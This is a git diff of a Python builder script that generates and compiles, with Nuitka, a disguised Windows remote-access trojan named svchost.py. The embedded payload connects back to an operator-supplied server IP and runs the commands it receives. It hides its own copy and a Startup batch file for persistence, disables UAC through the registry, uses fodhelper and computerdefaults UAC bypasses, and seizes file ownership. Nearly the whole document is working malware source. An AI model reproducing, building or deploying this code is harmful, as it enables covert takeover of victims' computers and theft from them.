@@ -1,40 +1,40 @@
-from subprocess import getoutput
-from os import system,environ
+from os import system
 from sys import exit
 def nuitka()->None:
     ip_address=str(input("Server IP:"))
     with open("svchost.py","w") as file:
         file.write(buf%ip_address)
-    environ["CCFLAGS"]="-Ofast"
     system("nuitka .\\svchost.py --mode=accelerated --mode=onefile --remove-output --windows-console-mode=disable --include-data-files=.\\run.exe=.\\run.exe")
     exit(0)
 buf=r'''from platform import node,release,machine,processor
 from ctypes import windll
 from pickle import dumps
 from subprocess import getoutput,call
-from sys import exit,argv
+from sys import exit,orig_argv
 from os import chdir,environ,system as run
 from os.path import basename
 from socket import socket,AF_INET,SOCK_STREAM,gaierror
 from shutil import copyfile
 from winreg import OpenKeyEx,HKEY_LOCAL_MACHINE,KEY_WRITE,SetValueEx,REG_DWORD,CloseKey
 from psutil import process_iter,AccessDenied
-def process_is_double(target:str=argv[0])->bool:
-    exists=False
+environ["exe"]=" ".join([i for i in orig_argv])
+def process_is_double(target:str=None)->int:
+    if target:target = target + ".exe" if target.split(".")[-1] != "exe" else target
+    else :target=" ".join([i for i in orig_argv])
+    target=target.split(" ")[0]
     process = 0
-    if argv[0] == target:
+    if " ".join([i for i in orig_argv]) == target:
         for i in process_iter():
             try:
                 if i.exe() == target:
                     process +=1
             except AccessDenied:pass
-        return (process >1)
+        return process
     for i in process_iter():
         try:
-            if i.name() == basename(target):exists=True
             if i.exe() == target:process +=1
         except AccessDenied:pass
-    return exists and process >1
+    return process
 def process_is_exists(target:str)->bool:return target in (i.name() for i in process_iter())
 def split(target:str,tstr:str)->str:
     new_chars=[]
@@ -52,12 +52,12 @@ def connect()->None:
     except ConnectionRefusedError:connect()
     except gaierror:connect()
 def CYS()->None:
-    copyfile(argv[0],(r"C:\Users\{}\Documents\\"+basename(argv[0])).format(environ.get("username")))
+    copyfile(" ".join([i for i in orig_argv]),(r"C:\Users\{}\Documents\\"+basename(" ".join([i for i in orig_argv]))).format(environ.get("username")))
     with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat".format(environ.get("username")), "w") as file:
         file.write("""@Echo off
 start C:\\Users\\{0}\\Documents\\{1}
-exit""".format(environ.get("username"), basename(argv[0])))
-    run("attrib +s +h +r C:\\Users\\"+environ.get("username")+"\\Documents\\"+basename(argv[0]))
+exit""".format(environ.get("username"), basename(" ".join([i for i in orig_argv]))))
+    run("attrib +s +h +r C:\\Users\\"+environ.get("username")+"\\Documents\\"+basename(" ".join([i for i in orig_argv])))
     run("attrib +s +h +r \"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\start.bat\"".format(environ.get("username")))
 def LUA_OFF()->None:
     key = OpenKeyEx(HKEY_LOCAL_MACHINE,r"SOFTWARE\Microsoft\Windows\CurrentVersion\\Policies\\System", 0, KEY_WRITE)
@@ -66,23 +66,28 @@ def LUA_OFF()->None:
     CYS()
     call("shutdown /r /f /t 0")
     exit(0)
-def computerdefaults(target:str=argv[0])->None:
-    target = target + ".exe" if target.split(".")[-1] != "exe" else target
-    ms_reg = "computerdefaults.exe"
-    if argv[0] == target:
-        while not process_is_double():call(f"run {target} {ms_reg} computerdefaults.exe")
+def computerdefaults(target:str=None)->None:
+    if target:target = target + ".exe" if target.split(".")[-1] != "exe" else target
+    else :target=" ".join([i for i in orig_argv])
+    if " ".join([i for i in orig_argv]) == target:
+        x=process_is_double()
+        while not x<process_is_double():
+            print(x,process_is_double())
+            call("run computerdefaults.exe {}".format(target))
+            if x<process_is_double():return
         return None
-    while not process_is_exists(basename(target)):call(f"run {target} {ms_reg} computerdefaults.exe")
-def fodhelper(target:str=argv[0])->None:
+    while not process_is_exists(basename(target)):call("run computerdefaults.exe {}".format(target))
+def fodhelper(target:str=None)->None:
+    if target:target = target + ".exe" if target.split(".")[-1] != "exe" else target
+    else :target=" ".join([i for i in orig_argv])
     target= target+".exe" if target.split(".")[-1] !="exe" else target
-    ms_reg = "fodhelper.exe"
-    if argv[0] == target:
-        while not process_is_double():
-            call(f"run {target} {ms_reg} fodhelper.exe")
-        return None
-    while not process_is_exists(basename(target)):
-        call(f"run {target} {ms_reg} fodhelper.exe")
-        process_is_exists(basename(target))
+    if " ".join([i for i in orig_argv]) == target:
+        x=process_is_double()
+        while not x<process_is_double():
+            print(x,process_is_double())
+            call("run fodhelper.exe {}".format(target))
+            if x<process_is_double():return
+    while not process_is_exists(basename(target)):call("run fodhelper.exe {}".format(target))
 def FDR(target:str)->None:
     run("takeown /D Y /R /F {}".format(target))
     run("icacls {} /T /C /grant {}:(F,MA)".format(target,environ.get("username")))
@@ -130,7 +135,7 @@ while True:
             s.send("success".encode())
             continue
         if "executable" in lcmd:
-            s.send(argv[0].encode())
+            s.send(" ".join([i for i in orig_argv]).encode())
             continue
         if "cmd /c start" in lcmd:
             call(cmd)
@@ -141,6 +146,5 @@ while True:
     except ConnectionResetError:connect()
     except OSError:connect()'''
 print("Checking For Nuitka")
-nuitka_v=getoutput("nuitka --version").split()[0]
-if len(nuitka_v)<7:nuitka()
-else:print("You Don't Have Installed Nuitka!!\nYou Can Install It Using pip install Nuitka")
+from nuitka import __doc__
+nuitka()
